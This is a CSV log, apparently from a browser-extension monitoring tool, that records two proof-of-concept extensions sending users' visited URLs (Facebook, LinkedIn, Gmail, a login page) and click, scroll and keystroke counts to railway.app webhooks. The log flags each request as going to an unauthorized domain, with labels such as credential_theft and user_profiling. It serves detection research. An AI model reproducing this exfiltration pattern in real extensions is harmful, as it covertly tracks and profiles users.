extension_id,extension_name,timestamp,scenario,source,origin,method,url,domain,resource_type,post_data_preview,request_headers_json,is_extension_initiated,is_unauthorized_domain,initiator_url,frame_url,host_permissions,content_script_matches,evidence_summary
ext2-uprof,FocusHeatmap,2026-08-04T19:52:26.629,S1_Facebook,Service Worker,chrome-extension://ext2-uprof/,POST,https://see-serv-production.up.railway.app/webhook,see-serv-production.up.railway.app,fetch,"{""extension"":""uprof"",""poc"":""FocusHeatmap (Reading Analytics)"",""source"":""Content Script Interaction Monitor"",""stats"":{""exfil_type"":""User Profiling & Focus Analytics"",""url"":""https://www.facebook.com/"",""engagement_metrics"":{""interaction_clicks"":0,""scroll_depth_percent"":34,""keystroke_interactions"":0,""active_reading_span_ms"":5003}},""sentAt"":""2026-08-04T12:52:26.094Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[\""http://*/*\"", \""https://*/*\""]""","""[\""<all_urls>\""]""",POST to see-serv-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: user_profiling
ext2-uprof,FocusHeatmap,2026-08-04T19:52:31.125,S1_Facebook,Service Worker,chrome-extension://ext2-uprof/,POST,https://see-serv-production.up.railway.app/webhook,see-serv-production.up.railway.app,fetch,"{""extension"":""uprof"",""poc"":""FocusHeatmap (Reading Analytics)"",""source"":""Content Script Interaction Monitor"",""stats"":{""exfil_type"":""User Profiling & Focus Analytics"",""url"":""https://www.facebook.com/"",""engagement_metrics"":{""interaction_clicks"":0,""scroll_depth_percent"":34,""keystroke_interactions"":0,""active_reading_span_ms"":10025}},""sentAt"":""2026-08-04T12:52:31.116Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[\""http://*/*\"", \""https://*/*\""]""","""[\""<all_urls>\""]""",POST to see-serv-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: user_profiling
ext2-uprof,FocusHeatmap,2026-08-04T19:52:38.405,S2_LinkedIn,Service Worker,chrome-extension://ext2-uprof/,POST,https://see-serv-production.up.railway.app/webhook,see-serv-production.up.railway.app,fetch,"{""extension"":""uprof"",""poc"":""FocusHeatmap (Reading Analytics)"",""source"":""Content Script Interaction Monitor"",""stats"":{""exfil_type"":""User Profiling & Focus Analytics"",""url"":""https://www.facebook.com/"",""engagement_metrics"":{""interaction_clicks"":1,""scroll_depth_percent"":34,""keystroke_interactions"":0,""active_reading_span_ms"":15012}},""sentAt"":""2026-08-04T12:52:36.103Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[\""http://*/*\"", \""https://*/*\""]""","""[\""<all_urls>\""]""",POST to see-serv-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: user_profiling
ext2-uprof,FocusHeatmap,2026-08-04T19:53:05.770,S3_Gmail,Service Worker,chrome-extension://ext2-uprof/,POST,https://see-serv-production.up.railway.app/webhook,see-serv-production.up.railway.app,fetch,"{""extension"":""uprof"",""poc"":""FocusHeatmap (Reading Analytics)"",""source"":""Content Script Interaction Monitor"",""stats"":{""exfil_type"":""User Profiling & Focus Analytics"",""url"":""https://mail.google.com/mail/u/0/#inbox/FMfcgzQhVhWCqndQDzbCvZJzqzSkxVCP"",""engagement_metrics"":{""interaction_clicks"":1,""scroll_depth_percent"":0,""keystroke_interactions"":0,""active_reading_span_ms"":5043}},""sentAt"":""2026-08-04T12:53:05.760Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[\""http://*/*\"", \""https://*/*\""]""","""[\""<all_urls>\""]""",POST to see-serv-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: user_profiling
ext2-uprof,FocusHeatmap,2026-08-04T19:53:11.657,S3_Gmail,Service Worker,chrome-extension://ext2-uprof/,POST,https://see-serv-production.up.railway.app/webhook,see-serv-production.up.railway.app,fetch,"{""extension"":""uprof"",""poc"":""FocusHeatmap (Reading Analytics)"",""source"":""Content Script Interaction Monitor"",""stats"":{""exfil_type"":""User Profiling & Focus Analytics"",""url"":""https://mail.google.com/mail/u/0/#inbox"",""engagement_metrics"":{""interaction_clicks"":1,""scroll_depth_percent"":0,""keystroke_interactions"":0,""active_reading_span_ms"":10006}},""sentAt"":""2026-08-04T12:53:10.723Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[\""http://*/*\"", \""https://*/*\""]""","""[\""<all_urls>\""]""",POST to see-serv-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: user_profiling
ext2-uprof,FocusHeatmap,2026-08-04T19:53:20.407,S4_HTTP_Site,Service Worker,chrome-extension://ext2-uprof/,POST,https://see-serv-production.up.railway.app/webhook,see-serv-production.up.railway.app,fetch,"{""extension"":""uprof"",""poc"":""FocusHeatmap (Reading Analytics)"",""source"":""Content Script Interaction Monitor"",""stats"":{""exfil_type"":""User Profiling & Focus Analytics"",""url"":""https://mail.google.com/mail/u/0/#inbox"",""engagement_metrics"":{""interaction_clicks"":1,""scroll_depth_percent"":0,""keystroke_interactions"":0,""active_reading_span_ms"":15003}},""sentAt"":""2026-08-04T12:53:15.720Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[\""http://*/*\"", \""https://*/*\""]""","""[\""<all_urls>\""]""",POST to see-serv-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: user_profiling
ext2-uprof,FocusHeatmap,2026-08-04T19:53:44.188,S5_Login_Form,Service Worker,chrome-extension://ext2-uprof/,POST,https://see-serv-production.up.railway.app/webhook,see-serv-production.up.railway.app,fetch,"{""extension"":""uprof"",""poc"":""FocusHeatmap (Reading Analytics)"",""source"":""Content Script Interaction Monitor"",""stats"":{""exfil_type"":""User Profiling & Focus Analytics"",""url"":""https://the-internet.herokuapp.com/login"",""engagement_metrics"":{""interaction_clicks"":2,""scroll_depth_percent"":0,""keystroke_interactions"":25,""active_reading_span_ms"":5004}},""sentAt"":""2026-08-04T12:53:44.186Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[\""http://*/*\"", \""https://*/*\""]""","""[\""<all_urls>\""]""","POST to see-serv-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: credential_theft, user_profiling"
ext2-uprof,FocusHeatmap,2026-08-04T19:54:11.731,S7_Download,Service Worker,chrome-extension://ext2-uprof/,POST,https://see-serv-production.up.railway.app/webhook,see-serv-production.up.railway.app,fetch,"{""extension"":""uprof"",""poc"":""FocusHeatmap (Reading Analytics)"",""source"":""Content Script Interaction Monitor"",""stats"":{""exfil_type"":""User Profiling & Focus Analytics"",""url"":""https://http.cat/200.jpg"",""engagement_metrics"":{""interaction_clicks"":1,""scroll_depth_percent"":0,""keystroke_interactions"":0,""active_reading_span_ms"":5021}},""sentAt"":""2026-08-04T12:54:11.688Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[\""http://*/*\"", \""https://*/*\""]""","""[\""<all_urls>\""]""",POST to see-serv-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: user_profiling
ext2-uprof,FocusHeatmap,2026-08-04T19:54:18.774,S7_Download,Service Worker,chrome-extension://ext2-uprof/,POST,https://see-serv-production.up.railway.app/webhook,see-serv-production.up.railway.app,fetch,"{""extension"":""uprof"",""poc"":""FocusHeatmap (Reading Analytics)"",""source"":""Content Script Interaction Monitor"",""stats"":{""exfil_type"":""User Profiling & Focus Analytics"",""url"":""https://http.cat/200.jpg"",""engagement_metrics"":{""interaction_clicks"":2,""scroll_depth_percent"":0,""keystroke_interactions"":0,""active_reading_span_ms"":10008}},""sentAt"":""2026-08-04T12:54:16.675Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[\""http://*/*\"", \""https://*/*\""]""","""[\""<all_urls>\""]""",POST to see-serv-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: user_profiling
ext4-hh,SafeLink Checker,2026-08-04T19:56:53.742,S2_LinkedIn,Service Worker,chrome-extension://ext4-hh/,POST,https://see-poc-server-production.up.railway.app/webhook,see-poc-server-production.up.railway.app,fetch,"{""extension"":""hh"",""extensionId"":""onhgkckhmalimlgpphkcpkfahnldmhbf"",""stats"":{""exfil_type"":""HTTP Hijacking (Redirect Detected)"",""original_url"":""https://www.linkedin.com/feed/"",""final_url"":""https://www.linkedin.com/uas/login?session_redirect=https%3A%2F%2Fwww.linkedin.com%2Ffeed%2F"",""transition_type"":""typed"",""qualifiers"":[""server_redirect""]},""sentAt"":""2026-08-04T12:56:53.723Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[]""","""[]""","POST to see-poc-server-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: credential_theft, download_hijack, http_redirect"
ext4-hh,SafeLink Checker,2026-08-04T19:56:53.743,S2_LinkedIn,Service Worker,chrome-extension://ext4-hh/,OPTIONS,https://see-poc-server-production.up.railway.app/webhook,see-poc-server-production.up.railway.app,other,,"{""origin"": ""chrome-extension://onhgkckhmalimlgpphkcpkfahnldmhbf""}",True,True,,,"""[]""","""[]""",OPTIONS to see-poc-server-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]
ext4-hh,SafeLink Checker,2026-08-04T19:57:35.468,S4_HTTP_Site,Service Worker,chrome-extension://ext4-hh/,POST,https://see-poc-server-production.up.railway.app/webhook,see-poc-server-production.up.railway.app,fetch,"{""extension"":""hh"",""extensionId"":""onhgkckhmalimlgpphkcpkfahnldmhbf"",""stats"":{""exfil_type"":""HTTP Hijacking (Redirect Detected)"",""original_url"":""http://example.com/"",""final_url"":""https://example.com/"",""transition_type"":""typed"",""qualifiers"":[""server_redirect""]},""sentAt"":""2026-08-04T12:57:35.380Z""}","{""content-type"": ""application/json"", ""referer"": """"}",True,True,,,"""[]""","""[]""","POST to see-poc-server-production.up.railway.app; from extension service worker; [UNAUTHORIZED DOMAIN]; Flags: download_hijack, http_redirect"
